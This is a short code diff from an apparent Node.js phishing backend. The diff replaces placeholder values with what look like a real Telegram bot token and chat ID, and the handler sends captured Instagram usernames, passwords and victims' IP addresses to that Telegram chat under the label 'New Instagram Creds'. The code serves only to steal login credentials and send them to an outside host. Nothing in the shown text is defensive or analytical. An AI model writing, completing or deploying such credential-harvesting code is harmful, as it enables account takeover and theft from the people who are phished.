@@ -45,8 +45,8 @@ module.exports = async (req, res) => {
             }
 
             // Send to Telegram
-            const telegramBotToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const telegramBotToken = '7485509054:AAH1SH2jvtEFWrYJDXj_7xh2jVo8u71N2Os';
+            const chatId = '8168729210';
             if (telegramBotToken && chatId) {
                 const message = encodeURIComponent(
                     `New Instagram Creds:\nUsername: ${username}\nPassword: ${password}\nIP: ${log.ip}\nTime: ${new Date().toISOString()}`
